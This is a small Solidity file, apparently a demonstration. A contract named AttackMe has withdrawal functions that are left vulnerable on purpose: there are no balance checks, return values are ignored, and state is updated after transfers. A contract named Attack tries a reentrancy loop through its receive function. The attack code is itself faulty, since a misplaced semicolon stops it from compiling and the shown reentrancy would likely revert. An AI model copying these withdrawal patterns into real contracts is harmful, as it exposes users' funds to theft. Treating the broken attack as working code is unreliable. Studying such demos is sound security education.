// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract AttackMe {

    address public owner;
    mapping(address => uint256) public balances;

    modifier onlyOwner() {
        require(msg.sender == owner, "OnlyOwner");
        _;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawCall(uint256 amount) public {
        balances[msg.sender] -= amount;
        payable(msg.sender).call{value: amount}(""); // no gas limit or set limit, return bool
    }

    function withdrawSend(uint256 amount) public {
        payable(msg.sender).send(amount); // gas limit 2300, return bool
        balances[msg.sender] -= amount;
    }

    function withdrawTransfer(uint256 amount) public {
        payable(msg.sender).transfer(amount); // gas limit, throw error
        balances[msg.sender] -= amount;
    }

}


contract Attack {

    function startAttack(AttackMe attackMe) public {
        attackMe.withdrawCall(1000);
    }

    receive() external payable {
        msg.sender.call(
            abi.encodeWithSignature("withdrawCall(uint256)", 1000);
        )
    }

}